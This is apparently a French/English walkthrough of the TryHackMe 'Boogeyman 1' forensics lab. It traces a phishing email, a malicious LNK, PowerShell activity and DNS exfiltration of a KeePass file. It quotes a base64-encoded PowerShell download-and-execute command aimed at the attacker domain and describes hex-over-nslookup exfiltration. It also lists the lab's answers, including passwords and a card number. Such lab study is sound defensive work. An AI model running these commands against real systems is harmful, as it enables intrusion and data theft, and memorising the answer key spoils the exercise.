## Introduction

Analyse des TTPs d'un threat group : de l'accès initial jusqu'à l'objectif final.

### Artefacts

Dossier : `/home/ubuntu/Desktop/artefacts`

|Fichier|Description|
|---|---|
|`dump.eml`|Copie du phishing email|
|`powershell.json`|Logs PowerShell de la workstation de Julianne (converti depuis evtx via [evtx2json](https://github.com/Silv3rHorn/evtx2json))|
|`capture.pcapng`|Capture réseau de la même workstation|

### Tools

|Outil|Usage|
|---|---|
|Thunderbird|Lecture email|
|[LNKParse3](https://github.com/Matmaus/LnkParse3)|Forensics fichiers `.lnk`|
|Wireshark|Analyse paquets (GUI)|
|Tshark|Analyse paquets (CLI)|
|jq|Parsing JSON CLI|
|grep / sed / awk / base64|Outils built-in|

---

## Email Analysis

**Contexte :** Julianne (finance, Quick Logistics LLC) reçoit un faux email de relance de facture impayée de "B Packaging Inc." -> pièce jointe malveillante -> compromission workstation. Groupe : **Boogeyman**, cible le secteur logistique.

![[boogeyman1_email.png]]

### Investigation Guide

**Artefact de départ :** `dump.eml` dans le dossier `artefacts/`

#### Option 1 - CLI

```bash
# Extraire et décoder le payload encodé en base64
cat <PAYLOAD_FILE> | base64 -d > Invoice.zip
```

#### Option 2 - Thunderbird

Double-clic sur le `.eml` -> ouvrir dans Thunderbird -> sauvegarder et extraire la pièce jointe.

#### Analyse du fichier LNK

```bash
lnkparse <LNK_FILE>
```

### Quesitons
#### What is the email address used to send the phishing email?

open dump.eml

![[00_Screenshots/boogeyman1_t2q1.png]]

**Answer** : agriffin@bpakcaging.xyz

#### What is the email address of the victim?

**Answer** : julianne.westcott@hotmail.com

#### What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

open the message view source, then search for a third party in the DKIM-Signature

![[boogeyman1_t2q3.png]]

**Answer** : elasticemail

#### What is the name of the file inside the encrypted attachment?

download and extract the file from the zip in the mail

![[boogeyman1_t2q4.png]]

**Answer** : Invoice_20230103.lnk

#### What is the password of the encrypted attachment?

the password is in the mail, cf screenshot question 1

**Answer** : Invoice2023!

#### Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

```bash
lnkparse Invoice_20230103.lnk 
```

![[boogeyman1_t2q5.png]]

**Answer** : aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

---

## Endpoint Security

Découverte : la pièce jointe malveillante exécute une commande PowerShell -> point de départ des activités endpoint.

### Investigation Guide

Analyser `powershell.json` avec `jq` en partant du payload initial identifié précédemment. Certains logs sont redondants -> les ignorer.

#### JQ Cheatsheet

|Action|Commande|
|---|---|
|Beautify output|`cat powershell.json \| jq`|
|Valeurs d'un champ (sans clé)|`cat powershell.json \| jq '.Field1'`|
|Valeurs d'un champ (avec clé)|`cat powershell.json \| jq '{Field1}'`|
|Plusieurs champs|`cat powershell.json \| jq '{Field1, Field2}'`|
|Trier par Timestamp|`cat powershell.json \| jq -s -c 'sort_by(.Timestamp) \| .[]'`|
|Trier par Timestamp + champs|`cat powershell.json \| jq -s -c 'sort_by(.Timestamp) \| .[] \| {Field}'`|

Documentation complète : [jq docs](https://jqlang.github.io/jq/manual/)

### Quesitons
#### What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

list all field in the powershell json file

```bash
jq -r 'keys[]' powershell.json |sort |uniq
AppDomain
Channel
ContextInfo
Descr
EventID
Hostname
Level
MessageNumber
MessageTotal
Path
Payload
ProcessId
Provider
RecordID
SID
ScriptBlockId
ScriptBlockText
Timestamp
UserData
```

filtered with the appropriate command

```bash
cat powershell.json | jq '.ScriptBlockText' |sort |uniq
```

![[boogeyman1_t3q1.png]]

**Answer** : cdn.bpakcaging.xyz,files.bpakcaging.xyz

#### What is the name of the enumeration tool downloaded by the attacker?

in the previous command output we can see the tool used

![[boodeyman1_t3q2.png]]

**Answer** : seatbelt

#### What is the file accessed by the attacker using the downloaded **sq3.exe** binary? Provide the full file path with escaped backslashes.

same output

![[boogeyman1_t3q3.png]]

**Answer** : C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite

#### What is the software that uses the file in Q3?

**Answer** : Microsoft Sticky Notes

#### What is the name of the exfiltrated file?

![[boogeyman1_t3q4.png]]

**Answer** protected_data.kdbx

#### What type of file uses the .kdbx file extension?

i search on internet

_"**L'extension .kdbx** identifie un fichier de base de données de mots de passe créé par le gestionnaire de mots de passe **KeePass Password Safe**."_

**Answer** : keepass

#### What is the encoding used during the exfiltration attempt of the sensitive file?

![[boogeyman1_t3q5.png]]

**Answer** : hex

#### What is the tool used for exfiltration?

**Answer**: nslookup

---

## Network Traffic Analysis

**Contexte :** Le threat actor a pu lire et exfiltrer deux fichiers potentiellement sensibles. Les domaines, ports et outil d'exfiltration ont été découverts dans la tâche précédente.

### Investigation Guide

- Utiliser les domaines et ports découverts dans la tâche précédente
- Toutes les commandes exécutées et leurs outputs sont loggés dans le packet capture
- Suivre les streams des commandes notables identifiées dans les logs PowerShell
- Le contenu des données exfiltrées est récupérable en comprenant comment il a été encodé et extrait (identifié via les logs PowerShell)

### Questions
#### What software is used by the attacker to host its presumed file/payload server?

```
http contains "files.bpakcaging.xyz"
```

![[boogeyman1_t4q1_2.png]]

then follow the tcp stream and check the header of the server response

![[boogeyman1_t4q1.png]]

**Answer** : python

#### What HTTP method is used by the C2 for the output of the commands executed by the attacker?

```
http contains "cdn.bpakcaging.xyz"
```

![[boogeyman1_t4q2.png]]

**Answer** : post

#### What is the protocol used during the exfiltration activity?

```
dns.qry.name == "cdn.bpakcaging.xyz"
```

![[boogeyman1_t4q3.png]]

**Answer** : dns

#### What is the password of the exfiltrated file?  

follow the stream of the sq3.exe file in http, then go to the next packet (750)

![[boogeyman1_t4q4.png]]

decode with cyberchef

**Answer** : %p9^3!lL^Mz47E2GaT^y

#### What is the credit card number stored inside the exfiltrated file?

**Answer** : 4024007128269551

---

## Résumé - TryHackMe : Boogeyman 1

### Contexte

Analyse forensique d'une compromission ciblant **Julianne Westcott** (finance, Quick Logistics LLC), orchestrée par le groupe **Boogeyman** via un faux email de relance de facture.

### Chaîne d'attaque (Kill Chain)

**1. Phishing (accès initial)** L'attaquant envoie un email depuis `agriffin@bpakcaging.xyz` via le relay **Elastic Email**, avec une pièce jointe ZIP chiffrée (`Invoice2023!`). À l'intérieur : un fichier **LNK** malveillant.

**2. Exécution (PowerShell)** Le `.lnk` déclenche une commande PowerShell encodée en base64 qui télécharge un payload depuis `files.bpakcaging.xyz`. L'outil d'énumération **Seatbelt** est ensuite déployé.

**3. Collecte de données**

- Lecture du fichier **Sticky Notes** (`plum.sqlite`) via `sq3.exe` — probablement pour récupérer des mots de passe notés
- Ciblage du fichier **KeePass** (`protected_data.kdbx`)

**4. Exfiltration** La base KeePass est exfiltrée en **hexadécimal** via des requêtes **DNS** (`nslookup`) vers `cdn.bpakcaging.xyz`, contournant ainsi les contrôles réseau classiques.

**5. C2** Les outputs des commandes sont envoyés en **HTTP POST** vers `cdn.bpakcaging.xyz`. Le serveur de fichiers tourne sous **Python** (SimpleHTTPServer).

### Objectif final

Récupérer les credentials KeePass (mdp : `%p9^3!lL^Mz47E2GaT^y`) contenant notamment un **numéro de carte bancaire** — cohérent avec le ciblage d'une cible dans la finance/logistique.

